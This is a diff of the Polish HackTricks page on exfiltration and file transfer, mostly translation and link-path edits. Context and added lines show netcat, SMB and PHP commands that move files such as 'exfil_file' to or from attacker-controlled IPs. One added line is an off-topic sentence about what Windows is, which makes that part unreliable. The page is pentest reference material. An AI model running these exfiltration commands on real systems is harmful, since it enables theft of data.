@@ -16,7 +16,7 @@ Inne sposoby wsparcia HackTricks:
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -24,7 +24,7 @@ Inne sposoby wsparcia HackTricks:
 
 ## Powszechnie zezwolone domeny do wyciekania informacji
 
-Sprawdź [https://lots-project.com/](https://lots-project.com/), aby znaleźć powszechnie zezwolone domeny, które mogą być nadużywane
+Sprawdź [https://lots-project.com/](https://lots-project.com/) aby znaleźć powszechnie zezwolone domeny, które mogą być nadużywane
 
 ## Kopiuj i Wklej Base64
 
@@ -65,7 +65,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ### Przesyłanie plików
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer drukujący żądania GET i POST (również nagłówki)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Moduł Pythona [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -185,18 +185,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-### Exfiltration
-
-Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
-
-1. **Compression**: Compressing data before exfiltration can help evade detection.
-2. **Encryption**: Encrypting exfiltrated data can prevent unauthorized access.
-3. **Steganography**: Hiding data within other files or images can be used to exfiltrate data without detection.
-4. **DNS Tunneling**: Using DNS requests to exfiltrate data can bypass network security measures.
-5. **Exfiltration over Alternative Protocols**: Utilizing protocols like ICMP or HTTP for data exfiltration can help avoid detection.
-6. **Cloud Storage**: Uploading exfiltrated data to cloud storage services can provide a convenient and stealthy exfiltration method.
-
-When exfiltrating data from a Windows system, it is important to consider the detection capabilities of security tools and implement countermeasures to avoid detection.
+Windows to system operacyjny stworzony przez firmę Microsoft. Jest powszechnie używany na komputerach osobistych i serwerach.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -220,7 +209,13 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-NC (Netcat) jest potężnym narzędziem do tworzenia połączeń sieciowych wiersza poleceń. Może być używany do przesyłania danych z jednego komputera na drugi poprzez TCP lub UDP. Może być również używany do nasłuchiwania portów na maszynie docelowej, co czyni go przydatnym narzędziem do eksfiltracji danych. Aby użyć NC do eksfiltracji danych, należy najpierw uruchomić nasłuchiwanie na maszynie docelowej, a następnie nawiązać połączenie z tą maszyną z maszyny źródłowej i przesłać dane. Można to zrobić za pomocą poleceń takich jak `nc -l -p <port>` do nasłuchiwania i `nc <host> <port> < plik` do przesyłania danych.
+NC (Netcat) jest potężnym narzędziem do tworzenia połączeń sieciowych wiersza poleceń. Może być używany do przesyłania danych z jednego komputera na drugi poprzez port TCP lub UDP. Może być również używany do nasłuchiwania portów na maszynie zdalnej, co czyni go przydatnym narzędziem do eksfiltracji danych. Aby użyć NC do przesłania pliku na zdalny serwer, możesz użyć polecenia:
+
+```bash
+nc <adres_ip> <port> < plik
+```
+
+Gdzie `<adres_ip>` i `<port>` to adres IP i numer portu serwera zdalnego, a `plik` to nazwa pliku, który chcesz przesłać.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -293,23 +288,7 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### VBScript Exfiltration Techniques
-
-VBScript can be used to exfiltrate data from a compromised system. Below are some common techniques:
-
-1. **Writing to Files**: VBScript can write data to a file on the system, which can then be exfiltrated using various methods.
-
-2. **Sending Emails**: VBScript can be used to send emails with the exfiltrated data as attachments or within the email body.
-
-3. **HTTP Requests**: VBScript can make HTTP requests to an external server controlled by the attacker to exfiltrate data.
-
-4. **DNS Tunneling**: VBScript can be used to perform DNS tunneling to exfiltrate data by encoding it within DNS requests.
-
-5. **FTP Transfer**: VBScript can transfer data using FTP to a remote server controlled by the attacker.
-
-6. **Executing Commands**: VBScript can execute commands to exfiltrate data by running commands that output the data.
-
-These techniques can be used by attackers to exfiltrate sensitive data from a compromised system using VBScript.
+Visual Basic Scripting Edition (VBScript) jest językiem skryptowym stworzonym przez Microsoft. Może być używany do tworzenia skryptów w systemach Windows. VBScript może być wykorzystywany do exfiltracji danych poprzez różne metody, takie jak wysyłanie danych na zdalny serwer za pomocą protokołów HTTP lub FTP.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -353,7 +332,7 @@ Program `debug.exe` nie tylko pozwala na inspekcję plików binarnych, ale takż
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Następnie skopiuj i wklej tekst do okna powłoki systemu Windows, a zostanie utworzony plik o nazwie nc.exe.
+Następnie skopiuj tekst i wklej go do okna powłoki systemu Windows, a zostanie utworzony plik o nazwie nc.exe.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -363,7 +342,7 @@ Następnie skopiuj i wklej tekst do okna powłoki systemu Windows, a zostanie ut
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -377,6 +356,6 @@ Inne sposoby wsparcia HackTricks:
 * Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
